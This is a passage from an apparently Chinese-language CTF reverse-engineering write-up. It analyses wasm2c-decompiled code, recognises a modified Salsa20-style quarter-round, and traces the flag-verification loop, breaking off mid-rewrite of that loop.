&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v55 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v56 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v55;
  v57 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v56);
  v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v59 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v58;
  v60 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v59);
  v61 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v62 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v61;
  v63 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v62);
  v64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v65 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v64;
  v66 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v65);
  v67 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
  v68 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v67;
  v69 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v66 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v63) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v60 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v57))) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v68);
  i32_store8(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v68, v69);            &lt;span style=&#34;color:#75715e&#34;&gt;// x[a] ^= ROL((x[c] + x[d]), 4)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个东西套到 &lt;code&gt;salsa20&lt;/code&gt; 的模板里就长这个样子&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define QUARTERROUND(x, a, b, c, d) \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[b] ^= ROL(x[a] + x[d], 1); \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[c] ^= ROL(x[b] + x[a], 2); \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[d] ^= ROL(x[c] + x[b], 3); \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[a] ^= ROL(x[d] + x[c], 4);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是那个 while 循环就是这个&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;);
    QUARTERROUND(v6&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来看一下验证部分&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; )
      {
        v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;);
        v31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;);
        v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v31;
        v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; w2c_f21(v30, v32);
        v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v33);
        v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v35;
        v55 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v36);
        v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v55 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3504LL&lt;/span&gt;);
        v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v34 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v37) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;);
        i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;, v38);
        v39 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;);
        v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;);
        v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v40;
        v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; w2c_f21(v39, v41 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v42);
        v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
        v45 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v44;
        v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v45) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
        v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load8_u(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3504LL&lt;/span&gt;);
        v47 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v43 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v46) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;);
        i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;, v47);
        v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;, v58);
      }
      v59 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
      i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20LL&lt;/span&gt;, v59);
    }
    v48 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;);
    w2c_free(v48);
    v60 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24LL&lt;/span&gt;);
    i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44LL&lt;/span&gt;, v60);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
LABEL_8:
    i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFFFFFFLL&lt;/span&gt;);
  }
  v49 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44LL&lt;/span&gt;);
  w2c_g0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;wasm_rt_call_stack_depth;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v49;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很显然 &lt;code&gt;v6+44&lt;/code&gt; 和 &lt;code&gt;v6+24&lt;/code&gt; 就是判断是否通过验证的，只要每次 &lt;code&gt;(v43 != v46)&lt;/code&gt; 和 &lt;code&gt;(v34 != v37)&lt;/code&gt; 不成立就行&lt;/p&gt;
&lt;p&gt;根据之前的经验，&lt;code&gt;v6+32&lt;/code&gt; 是第三个参数（密文字符串地址），&lt;code&gt;v6+20&lt;/code&gt; 是最外层循环的索引（每次 +8），&lt;code&gt;v6+8&lt;/code&gt; 是这层循环的次数，&lt;code&gt;v6+28&lt;/code&gt; 是上一个循环加密后的结果&lt;/p&gt;
&lt;p&gt;于是把这个循环简化一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(input); i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3;
        v31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i;
        v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v31;
        v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v30[v32];
        v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v33;
        v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cipher;
        v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cipher[i];
